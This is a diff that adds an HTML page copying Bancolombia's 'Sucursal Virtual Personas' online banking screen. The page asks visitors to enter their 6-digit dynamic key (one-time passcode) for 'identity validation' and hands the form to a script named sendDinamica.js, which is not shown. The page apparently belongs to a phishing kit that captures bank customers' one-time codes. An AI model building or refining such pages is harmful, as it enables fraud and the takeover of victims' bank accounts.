@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sucursal Virtual Personas | Bancolombia</title>
+    <link href="css/dinamica.css" media="all" rel="stylesheet" type="text/css">
+    <link rel="icon" href="img/logo.png">
+      <!-- API JQUERY -->
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+</head>
+<body>
+    <div class="container">
+        <header class="header">
+            <img src="img/logo.svg" alt="Bancolombia Logo" class="logo">
+            <h1>Sucursal Virtual Personas</h1>
+            <script language="javascript" src="js/jquery.jclockNew.js" type="text/JavaScript"></script>
+                           <script type="text/javascript">
+                           $(function($) {        
+                              var optionsEST = {
+                                utc: true,
+                                utcOffset: -5,
+                                format: "%A %R de %B de %Y %l:%M:%S %P", 
+                                language: "es"
+                              }
+                              $('#jclock1').jclockNew(optionsEST);
+                              });
+                        </script>
+                        <div class="time-box">
+                        <p>Fecha & hora actual: </p>
+                        <span id="jclock1" currentime="1659430932738" style="font-weight:300;">Martes 29 de Octubre de 2024 4:34:29 PM</span>
+                        </div>
+        </header>
+
+        <div class="validation-title">
+            <h2>Validación de Identidad</h2>
+        </div>
+
+        <div class="validation-title-two">
+            <h2>Clave Dinamica</h2>
+        </div>
+
+        <form class="sms-section" id="miForm">
+            <p style="margin-bottom:8px;font-weight:200;"></p>
+            
+            <div class="input-container">
+                <div class="input-label">
+                    <span class="info-icon">ⓘ</span>
+                    <label>Ingrese la clave dinamica de 6 digitos para la validacion.</label>
+                </div>
+                <div class="input-wrapper">
+                    <input type="text" class="input-field" id="miInput" maxlength="6" minlength="6" required>
+                    <span class="lock-icon">🔒</span>
+                </div>
+            </div>
+            <div id="contador">00:00</div>
+
+           <!-- <div class="timer-section">
+                <p hidden="">Por favor espere unos segundos para ingresar su cÃ³digo</p>
+                <p hidden="">0:24</p>
+            </div> -->
+
+            <div class="button-container">
+                <button type="submit" class="validate-btn">Validar</button>
+            </div>
+        </form>
+    </div>
+    <script type="module" src="js/sendDinamica.js"></script>
+    <script type="module" src="js/util.js"></script>
+  </body>
+</html>
